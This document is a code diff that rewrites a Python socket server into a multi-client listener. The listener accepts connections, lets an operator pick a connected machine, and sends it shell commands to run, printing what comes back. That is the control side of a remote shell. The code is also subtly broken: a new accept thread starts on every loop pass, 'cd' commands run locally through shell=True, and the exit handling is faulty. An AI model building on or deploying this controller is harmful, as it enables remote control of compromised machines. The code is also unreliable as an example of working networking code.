@@ -1,41 +1,101 @@
 import socket
+import threading
+import subprocess
 import sys
 
-server_address = '';
-print(server_address)
-# Create a TCP/IP socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+HOST = ''   # Symbolic name meaning all available interfaces
+PORT = 5555  # Arbitrary non-privileged port
 
-# Bind the socket to the port
-server_address = (server_address, 10000)
-print('Starting up on {} port {}'.format(*server_address))
-sock.bind(server_address)
+clients = []
 
-# Listen for incoming connections
-sock.listen(1)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(10)  # Maximum number of clients that can connect simultaneously
 
-while True:
-    # Wait for a connection
-    print('waiting for a connection')
-    connection, client_address = sock.accept()
 
-    try:
-        print('connection from', client_address)
-        # Receive the data in small chunks and retransmit it
-        while True:
-            print("Server>", end=" ")
-            cmd = input()
+def handle_client(socket):
+    conn, addr = socket.accept()
+    print(f"Client {addr[0]}:{addr[1]} connected.")
+    clients.append(conn)
 
-            if(cmd == 'quit'):
-                sock.close()
-                connection.close()
-                sys.exit()
 
-            if(len(str.encode(cmd)) > 0):
-                connection.send(str.encode(cmd))
-                client_response = str(connection.recv(1024), 'utf-8')
-                print(client_response, end="\n")
-    finally:
-        # Clean up the connection
-        print("Closing current connection")
-        connection.close()
+def handle_client_input(conn):
+    addr = conn.getpeername()
+
+    print(f"Connected to client: {addr[0]}:{addr[1]}", end="\n")
+
+    print("Enter a command to execute or type 'exit' to quit:\n")
+
+    while True:
+        conn.send("pwd".encode())
+        output = conn.recv(1024).decode();
+        print(output, end=">")
+        command = input()
+        
+        if command.lower() == 'clear':
+            conn.setblocking(0)
+            continue
+        
+        if command.lower() == 'exit':
+            conn.setblocking(0)
+            break
+
+        try:
+            conn.send(command.encode("utf-8"))
+            
+            if command.startswith("cd "):
+                # execute cd command using subprocess
+                output = subprocess.check_output(command, shell=True)
+                # send output back to server
+                conn.send(output)
+            else:
+                # receive output from client and print it
+                output = conn.recv(1024).decode("utf-8")
+                print(output)
+            
+        except ConnectionResetError:
+            print(f"Connection to {addr[0]}:{addr[1]} lost.")
+            break
+
+def list_clients():
+    print("\n*****\nConnected clients:\n*****")
+    for i, client in enumerate(clients):
+        addr = client.getpeername()
+        hostname = addr[0]
+        port = addr[1]
+        print(f"{i+1}. {hostname}:{port}")
+    
+    while True:
+        user_input = input(
+            "Enter a valid client numer or type 'exit' to quit: ").lower()
+
+        if user_input == 'exit':
+            break
+
+        try:
+            index = int(user_input) - 1
+            conn = clients[index]
+            if conn:
+                handle_client_input(conn)
+                break
+        except ValueError:
+            continue
+
+
+def main():
+    print('Waiting for clients...')
+    while True:
+        thread = threading.Thread(target=handle_client, args={s})
+        thread.start()
+
+        command = input("Enter a command or type 'exit' to quit: ").lower()
+        if command == 'list':
+            list_clients()
+        elif command == 'exit':
+            print("Have a nice day!")
+            sys.exit()
+
+
+
+if __name__ == '__main__':
+    main()
